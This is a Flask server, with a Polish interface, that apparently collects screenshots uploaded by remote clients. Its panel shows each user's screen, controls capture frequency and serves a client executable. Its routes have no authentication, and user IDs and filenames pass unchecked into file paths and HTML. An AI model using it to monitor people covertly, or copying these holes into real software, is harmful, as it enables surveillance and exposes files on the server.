from flask import Flask, request, send_file, jsonify, render_template_string, redirect, url_for
import os
import datetime
import json

app = Flask(__name__)
UPLOAD_FOLDER = "screens"
COMMAND_FOLDER = "commands"
CLIENT_DOWNLOAD_PATH = "client_download"

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(COMMAND_FOLDER, exist_ok=True)
os.makedirs(CLIENT_DOWNLOAD_PATH, exist_ok=True)

@app.route("/")
def index():
    users = sorted(os.listdir(UPLOAD_FOLDER))
    links = "".join([
        f'<li><a href="/view?user={u}">{u}</a> | <a href="/history?user={u}">Historia</a></li>'
        for u in users
    ])
    return f"""
        <h1>Użytkownicy</h1><ul>{links}</ul>
        <p><a href='/download'>⬇️ Pobierz klienta (.exe/.zip)</a></p>
        <p><a href='/latest_client.py'>📥 Pobierz aktualny client.py</a></p>
    """

@app.route("/latest_client.py")
def latest_client():
    path = os.path.join(CLIENT_DOWNLOAD_PATH, "latest_client.py")
    if os.path.exists(path):
        return send_file(path, mimetype="text/plain")
    return "Brak aktualnej wersji klienta.", 404

@app.route("/download")
def download_client():
    for f in os.listdir(CLIENT_DOWNLOAD_PATH):
        if f.endswith(".exe") or f.endswith(".zip"):
            return send_file(os.path.join(CLIENT_DOWNLOAD_PATH, f), as_attachment=True)
    return "Brak dostępnego pliku klienta.", 404

@app.route("/view")
def view():
    user = request.args.get("user")
    if not user:
        return redirect(url_for("index"))
    return render_template_string('''
        <html>
        <head>
            <title>Zdalny Podgląd - {{ user }}</title>
            <style>
                body { background: #111; color: white; text-align: center; font-family: sans-serif; }
                img { max-width: 90%; border: 2px solid white; margin: 10px auto; display: block; }
                .panel { margin-top: 20px; }
                button { margin: 5px; padding: 10px 20px; font-size: 16px; cursor: pointer; }
                .status-box { margin-top: 20px; padding: 10px; background: #222; border: 1px solid #555; display: inline-block; }
            </style>
            <script>
                const user = "{{ user }}";
                async function sendCommand(action) {
                    await fetch("/command?user=" + user, {
                        method: "POST",
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: "action=" + action
                    });
                    updateStatus();
                }

                async function updateStatus() {
                    const res = await fetch("/command?user=" + user);
                    const data = await res.json();
                    document.getElementById("status").innerText = `Status: ${data.paused ? 'Zatrzymany' : 'Aktywny'} | Interwał: ${data.interval}s`;
                }

                setInterval(updateStatus, 3000);
                window.onload = updateStatus;
            </script>
        </head>
        <body>
            <h1>📸 Podgląd Ekranu - {{ user }}</h1>
            <img src="/latest?user={{ user }}" />

            <div class="panel">
                <button onclick="sendCommand('one_shot')">Zrób screena teraz</button>
                <button onclick="sendCommand('pause')">Pauza</button>
                <button onclick="sendCommand('resume')">Start</button>
                <button onclick="sendCommand('faster')">Szybciej</button>
                <button onclick="sendCommand('slower')">Wolniej</button>
            </div>
            <div class="status-box" id="status">
                Status: ładowanie...
            </div>
        </body>
        </html>
    ''', user=user)

@app.route("/latest")
def latest():
    user = request.args.get("user")
    folder = os.path.join(UPLOAD_FOLDER, user)
    if not os.path.exists(folder):
        return "Brak screenów.", 404
    files = sorted(os.listdir(folder))
    if not files:
        return "Brak screenów.", 404
    return send_file(os.path.join(folder, files[-1]), mimetype='image/png')

@app.route("/upload", methods=['POST'])
def upload():
    user = request.form.get("user")
    if not user:
        return "Brak ID użytkownika", 400
    folder = os.path.join(UPLOAD_FOLDER, user)
    os.makedirs(folder, exist_ok=True)

    file = request.files['screenshot']
    now = (datetime.datetime.utcnow() + datetime.timedelta(hours=2)).strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"screenshot_{now}.png"
    filepath = os.path.join(folder, filename)
    file.save(filepath)
    return "OK"

@app.route("/history")
def history():
    user = request.args.get("user")
    folder = os.path.join(UPLOAD_FOLDER, user)
    if not os.path.exists(folder):
        return "Brak screenów.", 404
    files = sorted(os.listdir(folder))
    images = "".join([f'<li><a href="/screens/{user}/{f}" target="_blank">{f}</a></li>' for f in files])
    return f"<h1>Historia Screenów - {user}</h1><ul>{images}</ul>"

@app.route("/screens/<user>/<filename>")
def get_screen(user, filename):
    return send_file(os.path.join(UPLOAD_FOLDER, user, filename), mimetype='image/png')

@app.route("/command", methods=['GET', 'POST'])
def command():
    user = request.args.get("user")
    if not user:
        return "Brak ID użytkownika", 400
    command_file = os.path.join(COMMAND_FOLDER, f"{user}.json")

    if request.method == 'POST':
        action = request.form.get("action")
        data = {}
        if os.path.exists(command_file):
            with open(command_file, "r") as f:
                data = json.load(f)

        if action == "pause":
            data["paused"] = True
        elif action == "resume":
            data["paused"] = False
        elif action == "faster":
            data["interval"] = max(1, data.get("interval", 5) - 1)
        elif action == "slower":
            data["interval"] = data.get("interval", 5) + 1
        elif action == "one_shot":
            data["one_shot"] = True

        with open(command_file, "w") as f:
            json.dump(data, f)

        return "OK"
    else:
        if not os.path.exists(command_file):
            return jsonify({"paused": False, "interval": 5})
        with open(command_file, "r") as f:
            return jsonify(json.load(f))

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
